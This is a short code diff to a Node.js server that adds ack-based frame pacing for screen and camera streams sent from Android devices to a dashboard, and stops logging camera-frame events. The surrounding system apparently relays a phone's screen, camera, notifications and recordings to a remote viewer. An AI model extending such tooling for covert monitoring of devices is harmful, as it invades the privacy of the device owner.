@@ -1070,7 +1070,7 @@ async function processMessage(clientId, clientType, event, data) {
                      event === 'notification:entry'  || event === 'app:foreground'||
                      event === 'device:heartbeat'    || event === 'device:pong'   ||
                      event === 'command:response'    || event === 'screen:update' ||
-                     event === 'offline_recording:save';
+                     event === 'offline_recording:save' || event === 'camera:frame';
     if (!highFreq) {
         log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
     }
@@ -1519,6 +1519,10 @@ async function processMessage(clientId, clientType, event, data) {
         latestStreamFrame.set(deviceId, { ...frameMsg, _ts: now });
 
         broadcastDash('stream:frame', frameMsg);
+        // Send ack back to stream channel — device uses this for ack-based pacing on 3G/4G.
+        // The device only sends the next frame after receiving this ack, so frames never
+        // pile up in the TCP buffer and the dashboard always shows the freshest screen.
+        try { conn.write(JSON.stringify({ event: 'stream:ack', data: { deviceId } }) + '\n'); } catch (_) {}
         return;
     }
 
@@ -1540,6 +1544,8 @@ async function processMessage(clientId, clientType, event, data) {
         };
         latestCameraFrame.set(deviceId, cameraMsg);
         broadcastDash('camera:frame', cameraMsg);
+        // Ack-based pacing for camera stream — same pattern as screen stream
+        try { conn.write(JSON.stringify({ event: 'camera:ack', data: { deviceId } }) + '\n'); } catch (_) {}
         return;
     }
 
